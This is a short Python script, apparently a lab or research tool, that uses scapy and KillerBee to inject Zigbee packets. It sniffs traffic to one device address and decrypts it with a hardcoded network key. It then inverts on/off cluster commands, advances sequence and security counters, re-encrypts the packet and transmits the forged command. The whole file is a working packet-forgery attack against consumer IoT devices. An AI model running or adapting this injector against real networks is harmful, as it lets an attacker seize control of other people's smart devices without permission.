from scapy import *
from killerbee.scapy_extensions import *
import argparse

parser = argparse.ArgumentParser(description="Zigbee packet injector")
parser.add_argument("-c", type=int, dest="channel", choices=range(11, 25) , default=14)

args = parser.parse_args()

key = bytes.fromhex("c7398de1956fbe125d3463a58f1e3a3c")

#pkts = kbrdpcap("/home/kali/Downloads/test.pcap")

def craftPacket(pkt, data):
    pkt[0].getlayer("Dot15d4").seqnum += 3
    pkt[0].getlayer("ZigbeeNWK").seqnum += 3
    data.getlayer("ZigbeeAppDataPayload").counter += 1
    data.getlayer("ZigbeeClusterLibrary").transaction_sequence += 1
    data.getlayer("ZigbeeClusterLibrary").command_identifier ^= 0x01
    kbencrypt(pkt, data, key)
    pkt[0].getlayer("ZigbeeSecurityHeader").fc += 2
    pkt[0].getlayer("ZigbeeSecurityHeader").data += b'\xaa' 

dev = KillerBee(device=kbutils.devlist()[0][0])

try:
    while True:
        pkt = kbsniff(iface=dev, count=1, channel=14, lfilter=lambda x: x.getlayer("Dot15d4Data").dest_addr==0xaa51)

        pkt[0].show()

        if pkt[0].haslayer("ZigbeeSecurityHeader"):

            pkt[0].getlayer("ZigbeeSecurityHeader").data = pkt[0].getlayer("ZigbeeSecurityHeader").data[0:-2]
            dec = kbdecrypt(pkt[0], key)

            if (dec.haslayer("ZigbeeClusterLibrary")) and (dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0 or dec.getlayer("ZigbeeClusterLibrary").command_identifier == 1): 
                craftPacket(pkt, dec)
                print("New packet")
                pkt[0].show()
                kbsendp(pkt[0], 14, iface=dev)
except KeyboardInterrupt:
    dev.close()

    